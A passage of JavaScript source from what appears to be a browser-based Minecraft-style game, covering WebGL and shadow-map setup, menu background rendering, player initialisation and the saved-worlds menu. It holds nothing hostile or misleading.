		glCache.aShadow = gl.getAttribLocation(program3D, "aShadow")
		glCache.aSkylight = gl.getAttribLocation(program3D, "aSkylight")
		glCache.aBlocklight = gl.getAttribLocation(program3D, "aBlocklight")
		glCache.aTexture = gl.getAttribLocation(program3D, "aTexture")
		glCache.aVertex = gl.getAttribLocation(program3D, "aVertex")
		glCache.aNormal = gl.getAttribLocation(program3D, "aNormal")
    glCache.skyColor = gl.getUniformLocation(program3D, "skyColor")
    glCache.inLiquid = gl.getUniformLocation(program3D, "inLiquid")
    glCache.uTrans = gl.getUniformLocation(program3D, "uTrans")
    glCache.tint = gl.getAttribLocation(program3D, "aTint")
    glCache.isInWorld = gl.getUniformLocation(program3D, "isInWorld")
    glCache.flicker = gl.getUniformLocation(program3D, "flicker")
    glCache.brightness = gl.getUniformLocation(program3D, "brightness")
    glCache.endPortalSampler = gl.getUniformLocation(program3D, "endPortalSampler")
		glCache.uLantern = gl.getUniformLocation(program3D, "uLantern")
		glCache.fogTime = gl.getUniformLocation(program3D, "fogTime")
		glCache.lightMethod = gl.getUniformLocation(program3D, "lightMethod")
		if(settings.graphics === "morereal"){
			glCache.shadowMapSamplers = gl.getUniformLocation(program3D, "shadowMapSamplers")
			glCache.skylightView0 = gl.getUniformLocation(program3D, "skylightView[0]")
			glCache.skylightView1 = gl.getUniformLocation(program3D, "skylightView[1]")
			glCache.skylightView2 = gl.getUniformLocation(program3D, "skylightView[2]")
			glCache.skylightDir = gl.getUniformLocation(program3D, "skylightDir")
			glCache.skylightAmount = gl.getUniformLocation(program3D, "skylightAmount")
			glCache.skyOrange = gl.getUniformLocation(program3D, "skyOrange")
			gl.uniform1iv(glCache.shadowMapSamplers, [11,12,13])
		}
		gl.uniform1i(glCache.lightMethod, 0)
    gl.uniform1i(glCache.uTrans, 0)
		gl.uniform1f(glCache.uDist, 1000)
    gl.uniform1i(glCache.isInWorld, 0)
    gl.uniform1i(glCache.flicker, 0)
		gl.uniform1f(glCache.brightness, 1)
		gl.disableVertexAttribArray(glCache.aNormal)
		gl.vertexAttrib3f(glCache.aNormal, 0,1,0)
    
    gl.disableVertexAttribArray(glCache.tint)
		gl.vertexAttrib3f(glCache.tint, 1,1,1)
    
    gl.uniform1i(glCache.endPortalSampler, 8)
    //gl.uniform2f(glCache.screenSize, width,height)

		initAvgBrightnessProgram()
  }
  win.initWebglPrograms = initWebglPrograms
	async function initWebgl() {
		if (!win.gl) {
			let canv = document.createElement('canvas')
			canv.width = resWidth
			canv.height = resHeight
			canv.style.position = "absolute"
			canv.style.zIndex = -1
			canv.style.top = "0px"
			canv.style.left = "0px"
			canv.style.width = width+"px"
			canv.style.height = height+"px"
			canv.id = "glCanvas"
			gl = canv.getContext("webgl", { preserveDrawingBuffer: true, antialias: false, premultipliedAlpha: false})
			if(!gl) logError("Your browser doesn't support WebGL or something is wrong with your device.")
			let ext = gl.getExtension('OES_element_index_uint')
			if (!ext) {
				logError("Please use a supported browser, or update your current browser.")
			}
			gl.viewport(0, 0, canv.width, canv.height)
			gl.enable(gl.DEPTH_TEST)
			gl.enable(gl.BLEND)
			gl.blendFunc(gl.SRC_ALPHA, gl.ONE_MINUS_SRC_ALPHA)
			win.gl = gl
			glExtensions = {}
			const neededExtensions = ["vertex_array_object","depth_texture","texture_float"]
			const availableExtensions = gl.getSupportedExtensions()
			for (let i = 0; i < availableExtensions.length; i++) {
				const extensionName = availableExtensions[i].replace(/[A-Z]+_/g, "")
				if(neededExtensions.includes(extensionName)) glExtensions[extensionName] = gl.getExtension(availableExtensions[i])
			}
			canv.addEventListener("webglcontextlost", e => logError("WebGL context lost. Reload. "+e.statusMessage))
		} else {
			gl = win.gl
		}

		if (!document.body.contains(gl.canvas)) {
			document.body.append(gl.canvas)
		}

		initWebglPrograms()

		//Send the block textures to the GPU
		await initTextures()
		for(let s in shapes){
			//for(let v of shapes[s].varients){
				//if(!v) continue
			let v=shapes[s]
			let buffer = gl.createBuffer()
			gl.bindBuffer(gl.ARRAY_BUFFER, buffer)
			gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(v.verts.flat(Infinity)), gl.STATIC_DRAW)
			v.buffer = buffer
			//}
		}

    /*var data = []
    var rt = Math.PId/360
    var s = sin(-rt), c = cos(-rt)
    for(var deg=0; deg<Math.PId; deg+=rt){
      var s2 = sin(deg+rt), c2 = cos(deg+rt)
      data.push(s,0,c, s2,0,c, s2,1,c2, s,1,c2)
      s = s2, c = c2
    }*/
    /*data.push(1,1,1,-1,1,1,-1,-1,1,1,-1,1)
    tex.push(0,0,1,0,1,4,0,4)
    data.push(-1,1,-1,1,1,-1,1,-1,-1,-1,-1,-1)
    tex.push(0,0,1,0,1,4,0,4)
    win.panoramaVerts = data*/
    
		// These buffers are only used for drawing the main menu blocks
		sideEdgeBuffers = {}
		for (let side in shapes.cube.verts) {
			let edgeBuffer = gl.createBuffer()
			gl.bindBuffer(gl.ARRAY_BUFFER, edgeBuffer)
			gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(shapes.cube.verts[side][0]), gl.STATIC_DRAW)
			sideEdgeBuffers[side] = edgeBuffer
		}
		texCoordsBuffers = []
		for (let t in textureCoords) {
			let buff = gl.createBuffer()
			gl.bindBuffer(gl.ARRAY_BUFFER, buff)
			gl.bufferData(gl.ARRAY_BUFFER, textureCoords[t], gl.STATIC_DRAW)
			texCoordsBuffers.push(buff)
		}

		//Bind the Vertex Array Object (VAO) that will be used to draw everything
		indexBuffer = gl.createBuffer()
		gl.bindBuffer(gl.ELEMENT_ARRAY_BUFFER, indexBuffer)
		gl.bufferData(gl.ELEMENT_ARRAY_BUFFER, indexOrder, gl.STATIC_DRAW)

		//Top left pixel for average brightness
		avgBrightnessResultTexture = gl.createTexture()
		gl.activeTexture(gl.TEXTURE6)
		gl.bindTexture(gl.TEXTURE_2D, avgBrightnessResultTexture)
		gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 1, 1, 0, gl.RGBA, gl.UNSIGNED_BYTE, null)
		avgBrightnessPositionBuffer = gl.createBuffer()
		gl.bindBuffer(gl.ARRAY_BUFFER, avgBrightnessPositionBuffer)
		avgBrightnessFB = gl.createFramebuffer()
		gl.bindFramebuffer(gl.FRAMEBUFFER, avgBrightnessFB)
		gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, avgBrightnessResultTexture, 0)
		gl.bindFramebuffer(gl.FRAMEBUFFER, null)

		shadowMapTexture = [gl.createTexture(),gl.createTexture(),gl.createTexture()]
		gl.activeTexture(gl.TEXTURE11)
		gl.bindTexture(gl.TEXTURE_2D, shadowMapTexture[0])
		gl.texImage2D(gl.TEXTURE_2D, 0, gl.DEPTH_COMPONENT, shadowMapSize, shadowMapSize, 0, gl.DEPTH_COMPONENT, gl.UNSIGNED_INT, null)
		gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MIN_FILTER, gl.NEAREST)
		gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MAG_FILTER, gl.NEAREST)
		gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_S, gl.CLAMP_TO_EDGE)
		gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_T, gl.CLAMP_TO_EDGE)
		gl.activeTexture(gl.TEXTURE12)
		gl.bindTexture(gl.TEXTURE_2D, shadowMapTexture[1])
		gl.texImage2D(gl.TEXTURE_2D, 0, gl.DEPTH_COMPONENT, shadowMapSize, shadowMapSize, 0, gl.DEPTH_COMPONENT, gl.UNSIGNED_INT, null)
		gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MIN_FILTER, gl.NEAREST)
		gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MAG_FILTER, gl.NEAREST)
		gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_S, gl.CLAMP_TO_EDGE)
		gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_T, gl.CLAMP_TO_EDGE)
		gl.activeTexture(gl.TEXTURE13)
		gl.bindTexture(gl.TEXTURE_2D, shadowMapTexture[2])
		gl.texImage2D(gl.TEXTURE_2D, 0, gl.DEPTH_COMPONENT, shadowMapSize, shadowMapSize, 0, gl.DEPTH_COMPONENT, gl.UNSIGNED_INT, null)
		gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MIN_FILTER, gl.NEAREST)
		gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MAG_FILTER, gl.NEAREST)
		gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_S, gl.CLAMP_TO_EDGE)
		gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_T, gl.CLAMP_TO_EDGE)
		shadowMapFB = [gl.createFramebuffer(),gl.createFramebuffer(),gl.createFramebuffer()]
		for(let i=0; i<shadowMapFB.length; i++){
			gl.bindFramebuffer(gl.FRAMEBUFFER, shadowMapFB[i])
			gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.DEPTH_ATTACHMENT, gl.TEXTURE_2D, shadowMapTexture[i], 0)
		}
		gl.bindFramebuffer(gl.FRAMEBUFFER, null)

		//Tell it not to render the insides of blocks
		gl.enable(gl.CULL_FACE)
		gl.cullFace(gl.BACK)

		gl.lineWidth(2)
		blockOutlines = false
		gl.enable(gl.POLYGON_OFFSET_FILL)
		gl.polygonOffset(1, 1)
		gl.clearColor(sky[0], sky[1], sky[2], 1.0)
		gl.clear(gl.DEPTH_BUFFER_BIT | gl.COLOR_BUFFER_BIT)
	}
  
	let mainBGRot = 0, mainBGRotY = 0//-HALF_PI / 3;
	function renderMainBG(){
		let dnow = Date.now()
		mainBGRot = now*0.00008//(mapClamped(mouseX/width,0.4,0.6)*2-1)*0.02
		mainBGRotY = sin(mainBGRot*0.334323)*Math.PI4
		
		gl.clearColor(sky[0], sky[1], sky[2], 1.0)
		gl.clear(gl.DEPTH_BUFFER_BIT | gl.COLOR_BUFFER_BIT)
		//remove or add the slash to toggle comment
		//can be: //* or /*
		/*
		gl.useProgram(program3D)
		FOV(100)
		initModelView(null, 1, 1.5, 5, -HALF_PI / 25, mainBGRot)//-HALF_PI / 3
		gl.disableVertexAttribArray(glCache.aShadow)
		gl.disableVertexAttribArray(glCache.aSkylight)
		gl.disableVertexAttribArray(glCache.aBlocklight)
		gl.vertexAttrib1f(glCache.aShadow, 1.0)
		gl.vertexAttrib1f(glCache.aSkylight, 1.0)
		gl.vertexAttrib1f(glCache.aBlocklight, 1.0)

		gl.uniform3f(glCache.skyColor, sky[0], sky[1], sky[2])
		for (let i = 0; i < blocks.length; i += 4) {
			block2(blocks[i + 0], blocks[i + 1], blocks[i + 2], blocks[i + 3])
		}

		gl.enableVertexAttribArray(glCache.aShadow)
		gl.enableVertexAttribArray(glCache.aSkylight)
		gl.enableVertexAttribArray(glCache.aBlocklight)/*/
		use3d()
		FOV(90)
		initModelView(null, 0, 0, 0, mainBGRotY, mainBGRot, 1,1)
		gl.disableVertexAttribArray(glCache.aShadow)
		gl.disableVertexAttribArray(glCache.aSkylight)
		gl.disableVertexAttribArray(glCache.aBlocklight)
		gl.disableVertexAttribArray(glCache.tint)
		gl.vertexAttrib1f(glCache.aShadow, 1.0)
		gl.vertexAttrib1f(glCache.aSkylight, 1.0)
		gl.vertexAttrib1f(glCache.aBlocklight, 1.0)
		gl.vertexAttrib3f(glCache.tint, 1,1,1)
		
		gl.uniform1i(glCache.uSampler, 4)
		vertexAttribPointer("aVertex", program3D, "aVertex", 3, panoramaVertBuffer)
		vertexAttribPointer("aTexture", program3D, "aTexture", 2, panoramaTexBuffer)
		gl.disable(gl.CULL_FACE)
		/*gl.drawElements(gl.TRIANGLES, panoramaSize*6, gl.UNSIGNED_INT, 0)
		gl.uniform1i(glCache.uTrans, 1)*/
		gl.drawElements(gl.TRIANGLES, panoramaSize*6, gl.UNSIGNED_INT, 0)
		gl.uniform1i(glCache.uTrans, 0)
		gl.enable(gl.CULL_FACE)
		
		gl.enableVertexAttribArray(glCache.aShadow)
		gl.enableVertexAttribArray(glCache.aSkylight)
		gl.enableVertexAttribArray(glCache.aBlocklight)
		gl.uniform1i(glCache.uSampler, 0)
		//*/
	}
	async function initBackgrounds() {
		// Home screen background
    /*const blocks = [
      7, 4, 1, 7,
      7, 4, 2, 7,
      7, 4, 3, 7,
      7, 4, 4, 7,
      7, 5, 1, 7,
      7, 5, 2, 7,
      7, 5, 3, 7,
      6, 4, 0, 7,
      6, 4, 1, 7,
      6, 4, 2, 7,
      6, 4, 3, 7,
      6, 4, 4, 7,
      6, 5, 0, 7,
      6, 5, 1, 7,
      6, 5, 2, 7,
      6, 5, 3, 7,
      6, 5, 4, 7,
      6, 6, 3, 7,
      6, 6, 4, 7,
      6, 7, 3, 7,
      5, 0, -1, 1,
      5, 0, 0, 1,
      5, 0, 1, 1,
      5, 0, 2, 1,
      5, 1, 2, 29,
      5, 2, 2, 29,
      5, 3, 2, 29,
      5, 4, 2, 29,
      5, 5, 2, 29,
      5, 6, 2, 29,
      5, 4, 0, 7,
      5, 4, 1, 7,
      5, 4, 3, 7,
      5, 4, 4, 7,
      5, 5, 0, 7,
      5, 5, 1, 7,
      5, 5, 3, 7,
      5, 5, 4, 7,
      5, 6, 1, 7,
      5, 6, 3, 7,
      5, 7, 1, 7,
      5, 7, 2, 7,
      5, 7, 3, 7,
      4, -1, -1, 1,
      4, -1, 0, 1,
      4, -1, 1, 1,
      4, -1, 2, 1,
      4, 0, 3, 1,
      4, 0, 4, 1,
      4, 0, 5, 1,
      4, 0, 6, 1,
      4, 0, 7, 5,
      4, 0, 8, 5,
      4, 0, 9, 5,
      4, 0, 10, 5,
      4, 4, 0, 7,
      4, 4, 1, 7,
      4, 4, 2, 7,
      4, 4, 3, 7,
      4, 4, 4, 7,
      4, 5, 0, 7,
      4, 5, 1, 7,
      4, 5, 2, 7,
      4, 5, 3, 7,
      4, 5, 4, 7,
      4, 6, 1, 7,
      4, 6, 2, 7,
      4, 6, 3, 7,
      4, 7, 4, 7,
      3, -1, -1, 1,
      3, -1, 0, 1,
      3, -1, 1, 1,
      3, -1, 2, 1,
      3, -1, 3, 1,
      3, -1, 4, 1,
      3, 0, 5, 1,
      3, 0, 6, 1,
      3, 0, 7, 1,
      3, 0, 8, 5,
      3, 0, 9, 5,
      3, 0, 10, 5,
      3, 4, 1, 7,
      3, 4, 2, 7,
      3, 4, 3, 7,
      3, 4, 4, 7,
      3, 5, 1, 7,
      3, 5, 2, 7,
      3, 5, 3, 7,
      2, -1, -1, 1,
      2, -1, 0, 1,
      2, -1, 1, 1,
      2, -1, 2, 1,
      2, -1, 3, 1,
      2, -1, 4, 1,
      2, -1, 5, 1,
      2, -1, 6, 1,
      2, -1, 7, 1,
      2, 0, 8, 5,
      2, 0, 9, 5,
      2, 0, 10, 5,
      1, -2, -1, 1,
      1, -2, 0, 1,
      1, -2, 1, 1,
      1, -2, 2, 1,
      1, -2, 3, 1,
      1, -1, 4, 1,
      1, -1, 5, 1,
      1, -1, 6, 1,
      1, -1, 7, 1,
      1, -1, 8, 1,
      1, -1, 9, 5,
      1, -1, 10, 5,
      0, -2, -1, 1,
      0, -2, 0, 1,
      0, -2, 1, 1,
      0, -2, 2, 1,
      0, -2, 3, 1,
      0, -2, 4, 1,
      0, -2, 5, 1,
      0, -1, 6, 1,
      0, -1, 7, 1,
      0, -1, 8, 1,
      0, -1, 9, 5,
      0, -1, 10, 5,
      -1, -2, -1, 1,
      -1, -2, 0, 1,
      -1, -2, 1, 1,
      -1, -2, 2, 1,
      -1, -2, 3, 1,
      -1, -2, 4, 1,
      -1, -2, 5, 1,
      -1, -2, 6, 1,
      -1, -2, 7, 1,
      -1, -1, 8, 1,
      -1, -1, 9, 1,
      -1, -1, 10, 1,
      -2, -2, -1, 1,
      -2, -2, 0, 1,
      -2, -2, 1, 1,
      -2, -2, 2, 1,
      -2, -2, 3, 1,
      -2, -2, 4, 1,
      -2, -2, 5, 1,
      -2, -2, 6, 1,
      -2, -2, 7, 1,
      -2, -2, 8, 1,
      -2, -2, 9, 1,
      -2, -1, 10, 1,
      -3, -2, -1, 1,
      -3, -2, 0, 1,
      -3, -2, 1, 1,
      -3, -2, 2, 1,
      -3, -2, 3, 1,
      -3, -2, 4, 1,
      -3, -2, 5, 1,
      -3, -2, 6, 1,
      -3, -2, 7, 1,
      -3, -2, 8, 1,
      -3, -2, 9, 1,
      -3, -2, 10, 1,
      -3, -2, 11, 1,
      -3, -2, 12, 1,
      -4, -2, -1, 1,
      -4, -2, 0, 1,
      -4, -2, 1, 1,
      -4, -2, 2, 1,
      -4, -2, 3, 1,
      -4, -2, 4, 1,
      -4, -2, 5, 1,
      -4, -2, 6, 1,
      -4, -2, 7, 1,
      -4, -2, 8, 1,
      -4, -2, 9, 1,
      -4, -2, 10, 1,
      -4, -2, 11, 1,
      -4, -2, 12, 1,
      -5, -2, -1, 1,
      -5, -2, 0, 1,
      -5, -2, 1, 1,
      -5, -2, 2, 1,
      -5, -2, 3, 1,
      -5, -2, 4, 1,
      -5, -2, 5, 1,
      -5, -2, 6, 1,
      -5, -2, 7, 1,
      -5, -2, 8, 1,
      -5, -2, 9, 1,
      -5, -2, 10, 1,
      -5, -2, 11, 1,
      -5, -2, 12, 1,
      -6, -2, -1, 1,
      -6, -2, 0, 1,
      -6, -2, 1, 1,
      -6, -2, 2, 1,
      -6, -2, 3, 1,
      -6, -2, 4, 1,
      -6, -2, 5, 1,
      -6, -2, 6, 1,
      -6, -2, 7, 1,
      -6, -2, 8, 1,
      -6, -2, 9, 1,
      -6, -2, 10, 1,
      -6, -2, 11, 1,
      -7, -2, 3, 1,
      -7, -2, 4, 1,
      -7, -2, 5, 1,
      -7, -2, 6, 1,
      -7, -2, 7, 1,
      -7, -2, 8, 1,
      -7, -2, 9, 1,
      -8, -2, 2, 1,
      -8, -2, 3, 1,
      -8, -2, 4, 1,
      -8, -2, 5, 1,
      -8, -2, 6, 1,
      -8, -2, 7, 1,
      -8, -2, 8, 1,
      -8, -1, 8, 33,//birch tree
      -8, 0, 8, 33,
      -9, 1, 10, 7,
      -8, 1, 10, 7,
      -7, 1, 10, 7,
      -10, 1, 9, 7,
      -9, 1, 9, 7,
      -8, 1, 9, 7,
      -7, 1, 9, 7,
      -6, 1, 9, 7,
      -10, 1, 8, 7,
      -9, 1, 8, 7,
      -8, 1, 8, 7,
      -7, 1, 8, 7,
      -6, 1, 8, 7,
      -10, 1, 7, 7,
      -9, 1, 7, 7,
      -8, 1, 7, 7,
      -7, 1, 7, 7,
      -6, 1, 7, 7,
      -9, 1, 6, 7,
      -8, 1, 6, 7,
      -7, 1, 6, 7,
      -9, 2, 10, 7,
      -8, 2, 10, 7,
      -7, 2, 10, 7,
      -10, 2, 9, 7,
      -9, 2, 9, 7,
      -8, 2, 9, 7,
      -7, 2, 9, 7,
      -6, 2, 9, 7,
      -10, 2, 8, 7,
      -9, 2, 8, 7,
      -8, 2, 8, 7,
      -7, 2, 8, 7,
      -6, 2, 8, 7,
      -10, 2, 7, 7,
      -9, 2, 7, 7,
      -8, 2, 7, 7,
      -7, 2, 7, 7,
      -6, 2, 7, 7,
      -9, 2, 6, 7,
      -8, 2, 6, 7,
      -7, 2, 6, 7,
      -7, 3, 8, 7,//topper leaves
      -9, 3, 8, 7,
      -8, 3, 7, 7,
      -8, 3, 9, 7,
      -7, 4, 8, 7,
      -9, 4, 8, 7,
      -8, 4, 7, 7,
      -8, 4, 9, 7,
      3, 1, 8, 141,//cactus
      3, 2, 8, 141,
    ];*/
    /*var mainBG = document.createElement("canvas");
    mainBG.width = gl.canvas.width;
    mainBG.height = gl.canvas.height;*/
		const shape = shapes.panorama
    const shapeVerts = shape.verts
    const shapeTexVerts = shape.texVerts
    const size = shape.size
    let blockSides = Object.keys(Block)
    let texNum = 0
    let texture = []
    let index = 0
    for (let n = 0; n < 6; n++) {
      let side = blockSides[n]
      let directionalFaces = shapeVerts[n]
      for (let facei = 0; facei < directionalFaces.length; facei++) {
        let texShapeVerts = shapeTexVerts[n][facei]
        texture[index    ] = texShapeVerts[0]
        texture[index + 1] = texShapeVerts[1]
        texture[index + 2] = texShapeVerts[2]
        texture[index + 3] = texShapeVerts[3]
        texture[index + 4] = texShapeVerts[4]
        texture[index + 5] = texShapeVerts[5]
        texture[index + 6] = texShapeVerts[6]
        texture[index + 7] = texShapeVerts[7]
        index += 8
      }
      texNum++
    }
    
    panoramaVertBuffer = gl.createBuffer()
    gl.bindBuffer(gl.ARRAY_BUFFER, panoramaVertBuffer)
		gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(new Float32Array(shapeVerts.flat(Infinity))), gl.STATIC_DRAW)
    
    panoramaTexBuffer = gl.createBuffer()
    gl.bindBuffer(gl.ARRAY_BUFFER, panoramaTexBuffer)
		gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(new Float32Array(texture)), gl.STATIC_DRAW)
    
    panoramaSize = size

		// Dirt background
		use2d()
		let aspect = width / height
		let stack = height / 96
		let bright = 0.4
		if (dirtBuffer) {
			gl.deleteBuffer(dirtBuffer)
		}
		dirtBuffer = gl.createBuffer()
		gl.bindBuffer(gl.ARRAY_BUFFER, dirtBuffer)
		//let screenSize = 1/max(resolution,1)*2-1
		//let minRes = min(resolution,1)
		let bgCoords = new Float32Array([
			1, 1, 0, stack, bright,
			-1, 1, stack * aspect, stack, bright,
			-1, -1, stack * aspect, 0, bright,
			1, -1, 0, 0, bright
		])
		gl.bufferData(gl.ARRAY_BUFFER, bgCoords, gl.STATIC_DRAW)
		gl.uniform1i(glCache.uSampler2, 1)
		gl.clearColor(0, 0, 0, 1)
		gl.clear(gl.DEPTH_BUFFER_BIT | gl.COLOR_BUFFER_BIT)
		gl.vertexAttribPointer(glCache.aVertex2, 2, gl.FLOAT, false, 20, 0)
		gl.vertexAttribPointer(glCache.aTexture2, 2, gl.FLOAT, false, 20, 8)
		gl.vertexAttribPointer(glCache.aShadow2, 1, gl.FLOAT, false, 20, 16)
		gl.drawArrays(gl.TRIANGLE_FAN, 0, 4)
		let prevBg = dirtbg
		dirtbg = await createImageBitmap(gl.canvas,0,0,gl.canvas.width,gl.canvas.height)
		if(prevBg) prevBg.close()
    
    // Netherrack background
		bright = 0.4
		gl.uniform1i(glCache.uSampler2, 2) //netherrack textures uses TEXTURE2 so the number is 2
		gl.clearColor(0, 0, 0, 1)
		gl.clear(gl.DEPTH_BUFFER_BIT | gl.COLOR_BUFFER_BIT)
		gl.vertexAttribPointer(glCache.aVertex2, 2, gl.FLOAT, false, 20, 0)
		gl.vertexAttribPointer(glCache.aTexture2, 2, gl.FLOAT, false, 20, 8)
		gl.vertexAttribPointer(glCache.aShadow2, 1, gl.FLOAT, false, 20, 16)
		gl.drawArrays(gl.TRIANGLE_FAN, 0, 4)
		prevBg = netherbg
		netherbg = await createImageBitmap(gl.canvas,0,0,gl.canvas.width,gl.canvas.height)
		if(prevBg) prevBg.close()
    
    // Endstone background
		bright = 0.4
		gl.uniform1i(glCache.uSampler2, 5)
		gl.clearColor(0, 0, 0, 1)
		gl.clear(gl.DEPTH_BUFFER_BIT | gl.COLOR_BUFFER_BIT)
		gl.vertexAttribPointer(glCache.aVertex2, 2, gl.FLOAT, false, 20, 0)
		gl.vertexAttribPointer(glCache.aTexture2, 2, gl.FLOAT, false, 20, 8)
		gl.vertexAttribPointer(glCache.aShadow2, 1, gl.FLOAT, false, 20, 16)
		gl.drawArrays(gl.TRIANGLE_FAN, 0, 4)
		prevBg = endbg
		endbg = await createImageBitmap(gl.canvas,0,0,gl.canvas.width,gl.canvas.height)
		if(prevBg) prevBg.close()
	}
	const
		pW = 0.3,
		pTopH = 0.18,
		pDefaultBottomH = 1.62,
		pSitBottomH = 0.995,
		pSneakBottomH = 1.32,
		pSwimBottomH = 0.625
	//if you add something to above, change player entity too and server side
	function pSetScale(s){
		p.scale = s
		/*p.w = pW*s
		p.topH = pTopH*s
		p.defaultBottomH = pDefaultBottomH*s
		p.sitBottomH = pSitBottomH*s
		p.sneakBottomH = pSneakBottomH*s
		p.swimBottomH = pSwimBottomH*s*/
		thirdPersonReach = defaultThirdPersonReach*s
	}
	win.pSetScale = pSetScale
	function calcPd(){
		let diff = (now - p.lastUpdate) / tickTime
		if (diff > 1) diff = 1
		let rx = lerp(diff,p.prx,p.rx)
		let ry = lerp(diff,p.pry,p.ry)
		p.direction.x = -sin(ry) * cos(rx)
		p.direction.y = sin(rx)
		p.direction.z = cos(ry) * cos(rx)
	}
	function initPlayer() {
		p = new Player(true)
		p.gameMode = Math.random() > 0.5 ? "creative" : "survival"
    p.defaultSpeed = 0.11
		p.speed = p.defaultSpeed
		p.velocity = new PVector(0, 0, 0)
		p.sprintSpeed = 1.5
    p.sneakSpeed = 0.05
		p.flySpeed = 3.75
		p.x = 8
		p.y = 0
		p.z = 8
		p.previousX = 8
		p.previousY = 70
		p.previousZ = 8
		p.defaultBottomH = pDefaultBottomH
		p.sitBottomH = pSitBottomH
		p.sneakBottomH = pSneakBottomH
		p.swimBottomH = pSwimBottomH
		p.onGround = false
		p.jumpSpeed = 0.6
		p.sprinting = false
		p.gravityStength = -0.091
		p.lastUpdate = now
		p.lastBreak = Date.now()
		p.lastPlace = Date.now()
		p.lastJump = Date.now()
    p.lastForward = Date.now()
    p.lastStartBreak = 0
		p.autoBreak = false
    p.autoBuild = false
		p.flying = false
		p.sneaking = false
    p.sitting = false
    p.swimming = false
    p.spectating = null
		p.spectateRemoteControl = false
    p.health = 20
    p.oxygen = 20
    p.food = 20
    p.foodSaturation = 5
    p.foodTimer = 0
    p.foodJitter = 0
    p.eating = false
    p.lastY = 0 //y the last time it touched the ground
    p.camera = new Camera()
		p.camera.p = p
		p.shadowMapper = new CascadedShadowMapThing(p.camera)
		p.username = "Steve"
		p.id = "player"+generateID()
    p.thirdPerson = false
    p.spyglassTimer = 0
    p.spyglassStart = 0
    p.prevUsingSpyglass = false
    p.usingSpyglass = false
    p.XP = 0
    p.level = 0
    p.nextLevel = 0
    p.burning = false
    p.walking = false
    p.punchEffect = 0
    p.temperature = 10 // 0 to 20
    p.lastTemperature = 10
    p.bodyRot = 0
    p.dimension = ""
    p.die = false
    p.dieEffect = 0
    p.dieRotate = 0
    p.lastActive = 0
		p.inLiquid = 0
		p.prevInLiquid = 0
		p.blockHere = 0
		p.blockHereSolid = false
		p.sleeping = false
		p.lastDamage = 0
		p.lastDamageHealth = 0
		p.selectStart = null
		p.copySelect = null
		p.cOffsetX = 0
		p.cOffsetY = 0
		p.cOffsetZ = 0
		p.pCOffsetX = 0
		p.pCOffsetY = 0
		p.pCOffsetZ = 0
		p.offsetDist = 0
		p.direction = { x: 1, y: 0, z: 0 }// Normalized direction vector
		p.rx = 0
		p.ry = 0
		p.prx = 0
		p.pry = 0
		p.effects = {}
		p.riding = null
		p.ridingEnt = null
		
		win.player = p
		win.p2 = p2
	}
 /*function respawn(){
    let spawn = world.spawnPoint

    p.x = spawn.x
    p.z = spawn.z
    /*p.y = 0
      while(world.getBlock(0, p.y, 0)){
        p.y ++;
        if(p.y > maxHeight) break;
      }*-/
    p.y = p.lastY = spawn.y
    p.velocity.x = p.velocity.y = p.velocity.z = 0

		let respawnWithStuff = p.dimension === "end" && !cheats
    p.health = 20
    p.oxygen = 20
    harmEffect = 0
    healEffect = 0
    p.foodSaturation = 5
    p.foodTimer = 0
    p.foodExhaustion = 0
    p.food = 20
		if(!respawnWithStuff){
			p.lastXP = 0
			p.XP = 0
			p.level = 0
			p.totalXP = 0
			setLevel()
		}
		p.effects = {}
    freezeEffect = 0
    p.burnTimer = 0
    dieMessage = p.username+" died because \\_()_/" //the \\ actually shows up as \
    if(!respawnWithStuff) goToDimension("")
		p.riding = null
    p.hidden = false
    p.die = false
  }*/

	const worldsMenuDeselect = () => {
		let elem = window.worlds.getElementsByClassName("selected")
		if (elem && elem[0]) {
			elem[0].querySelector(".buttonContainer").remove()
			elem[0].classList.remove("selected")
		}
	}
	function initWorldsMenu() {
		while (window.worlds.firstChild) {
			window.worlds.removeChild(window.worlds.firstChild)
		}
		selectedWorld = 0
		window.boxCenterTop.value = ""
		addButton(window.worlds,"Create New World",() => changeScene("creation menu"),null,"centerBlock")

		function addWorld(name, version, size, id, edited, thumbnail, cloud) {
			let div = doc.getElementById(id) || doc.createElement("div")
			div.className = "world"
			div.onclick = e => {
				if(e.dOnTSeLEct) return
				worldsMenuDeselect()
				div.classList.add("selected")
				selectedWorld = id

				let buttonContainer = doc.createElement("div")
				buttonContainer.className = "buttonContainer"
				addButton(buttonContainer,"Play",playSelectedWorld)
				if(worlds[selectedWorld].edited){
					addButton(buttonContainer,"Delete",deleteSelectedWorld,"Delete the world forever.","right")
					addButton(buttonContainer,"Export",() => boxCenterTop.value = worlds[selectedWorld].code,"Export the save code into the text box above for copy/paste.","right")
					addButton(buttonContainer,"Edit",() => changeScene("editworld"),null,"right")
				}
				div.appendChild(buttonContainer)
			}
			let br = "<br>"
			div.id = id
			//<div class='thumbnailHover"+(!verMoreThan(version.replace(/Alpha|Beta/,""),'1.0.2') ? " warning" : "")+"'>
      div.innerHTML = "<img class='thumbnail'"+(thumbnail ? (" src='" + thumbnail + "'") : "")+"></div>"
			div.innerHTML += "<strong>" + Messages.format(name) + "</strong>" + br
			
			if (edited){
				let str = (new Date(edited).toLocaleDateString(undefined, {
					year: "numeric",
					month: "short",
					day: "numeric",
					hour: "numeric",
					minute: "2-digit"
				}))
				div.innerHTML += str + br
			}
			div.innerHTML += version + br
      if(cloud) div.innerHTML += `Cloud Save (${formatBytes(size)})`
			else div.innerHTML += `${formatBytes(size)} used`
			
			window.worlds.appendChild(div)
		}

